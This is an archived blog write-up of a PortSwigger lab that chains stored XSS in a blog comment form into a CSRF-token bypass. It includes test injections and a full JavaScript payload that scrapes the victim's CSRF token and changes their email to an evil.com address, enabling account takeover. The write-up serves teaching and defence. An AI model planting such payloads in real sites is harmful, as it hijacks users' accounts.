# How To Bypass CSRF Defenses With XSS

- **Source URL:** https://medium.com/@dante.falls/how-to-bypass-csrf-defenses-with-xss-44a124b7646a?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250117031129/https://medium.com/@dante.falls/how-to-bypass-csrf-defenses-with-xss-44a124b7646a?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8474 (id 8474)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How To Bypass CSRF Defenses With XSS

So you’re a developer and you have correctly implemented Cross Site Request Forgery (CSRF) protection. All authenticated requests require the user’s unique CSRF token, or else the request will be denied. Everyone celebrates and you go out for a night on the town. You wake up the next morning, hazy and hung over, to the chirping of endless emails from frustrated users. They all claim their accounts were taken over after reading blogs on your website. Whoops…what could have happened?

You know it wasn’t the CSRF tokens, because you made sure they are required before users can change their emails. So what happened? Cross Site Scripting (XSS) is what happened. Somewhere during development, you (or someone else) forgot to sanitize user input somewhere on the blog. This allowed an attacker to inject a script that makes unsuspecting users change their email address. Let’s analyze the technical details of this scenario.

# Scenario

The website that you run is a blog website, where users can login and write blogs, and comment on other user’s blog posts. It is your classic social media, and lots of users frequent this website and read the blogs. Here is an image of the front page and a basic user blog:

## Authentication

Before they can blog, users must first log into the website. Analyze the authentication process below. Notice the authentication process is protected with a **csrf token**. Also notice that when the user logs in, they receive a **session token** from the server. The session token has a “**SameSite=None**” attribute, so the user’s session token can be used in Cross Site Requests. After logging in, the user is directed to their **/my-account** page.

## Updating Email Address

Users can also update their email address on the website. The request to update the user’s email address must include the user’s unique **csrf token**, or else the request will be denied. Analyze the images below to see that updating the user’s email address is only possible with the correct **csrf token**.

## Stored XSS

So if the CSRF tokens aren’t the problem, then how were the user email addresses changed without their consent? Let’s analyze the commenting functionality to answer this question.

We know that users can comment on other user’s blog posts, so lets test the comment form for xss. We want to know if we can inject JavaScript into the comment section, but first let’s try to inject HTML into the comment section and see if it is rendered. I will try to inject a \<mark>TEST1337ARDVARK\</mark> into the comment section of another user’s blog post. If my comment is highlighted, then we know HTML can be injected and rendered on the page. Analyze the images below to see if the HTML is rendered after I post my comment.

## Analyzing The Page Source

In the below image of the blog page source, you can see that our HTML is successfully injected into a \<p> tag in the comment section. Our \<mark>TEST1337ARDVARK\</mark> is not sanitized.

## Testing For Stored XSS

Now that we know HTML Injection is possible, let’s try to inject JavaScript into the comment section to see if we can achieve XSS. We will try to inject a classic \<script>prompt(“XSS-CONFIRMED”)\</script> as a comment, and then we will view the comments of the blog we just commented on. Analyze the images below where we identify that Stored XSS is possible in the comment section of user blog posts. Notice that the input is still not sanitized in the comment section of the blog.

# XSS To CSRF Proof Of Concept

So now that we have identified Stored XSS in the comment section of user’s blogs, let’s create a proof of concept that uses the Stored XSS to update other user’s email addresses.

From the requests earlier in this article, we know that the server requires 2 things to update a user’s email address.

1. Session Cookie
2. CSRF Token

The Session Cookies have SameSite=None, so they can be sent in Cross Site requests. So the browser will automatically include this in the user’s request. The only thing our proof of concept must collect is the user’s **csrf token.**

Analyze the JavaScript proof of concept below that collects the user’s **csrf token** from their /my-account page, then uses the csrf token to make the user make a POST to /my-account/change-email that updates their email address to **you-got-hacked@evil.com**

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=you-got-hacked@evil.com')
};
</script>
```
If an attacker posts this as a comment on a user’s blog, any user that visits that specific blog will have their email address updated to **you-got-hacked@evil.com**. Lets test this out, analyze the images below where I post the above malicious JavaScript as a comment on postId=1 (blog #1). And then when I visit the blog again, in the background my browser sends the requests needed to change my email.

It might be hard to determine this based upon the above images, but after I posted my XSS payload and then went back to blog #1 ([https://0afe000a04d03ae184a1042100be00a1.web-security-academy.net/post?postId=1](https://web.archive.org/web/20250117031129/https://0afe000a04d03ae184a1042100be00a1.web-security-academy.net/post?postId=1)) my browser made requests in the background to change my email address. The GET request to /my-account was made with an xhr request, confirming it is from the JavaScript execution. However, the POST request to change my email address was unsuccessful because another user already had their email address changed, making the email address unavailable.

# Impact

The impact of this Stored XSS leading to a CSRF Attack that changes the user’s email address effects all 3 categories of the CIA Triad.

**Confidentiality**: Having your email address changed could lead to your account being taken over by the attacker. After the attacker changes the victim’s email address to their own email, they can make a forgot password request using the victim’s username, and the link to change the password will be sent to the attacker’s email address. After the attacker gains access to the victim’s account, they can view their sensitive information, effecting the confidentiality of the user’s data.

**Integrity**: The integrity of the user’s data is effected, as well. Users should be able to use the blogging service without worrying about their data (such as their email address) being changed without their knowledge or consent.

**Availability**: After the attacker changes the user’s email address and password, the user will not be able to access their account. This has a clear effect on availability. If users can’t log into your website, they can’t use your services or access their data.

# ChatGippity Generated Conclusion

In conclusion, even robust defenses like CSRF protection can be bypassed when other vulnerabilities, such as XSS, are present. In the example provided, a stored XSS vulnerability allowed an attacker to collect CSRF tokens and make unsuspecting users perform authenticated actions on their accounts. This ultimately led to users having their accounts taken over by the attacker.

This scenario underscores the interconnectedness of web application vulnerabilities and the importance of comprehensive security practices. Developers must ensure that all user inputs are sanitized to prevent XSS and validate both client- and server-side defenses against attack chains.

By addressing vulnerabilities holistically, including proper input sanitization, adhering to secure coding practices, and conducting regular penetration testing, developers can significantly reduce the risk of complex, chained exploits like XSS-to-CSRF attacks. Failure to do so leaves applications — and their users — vulnerable to significant security breaches that may impact the confidentiality, integrity, and availability of their data.

**The lab showcased in this article is owned by Portswigger and can be found HERE.**

**Thanks for reading, and if you learned something, THANK YOU FOR LEARNING!**

**Check out my other articles below, say Hi in the comments, and click that clap button for me please =)**
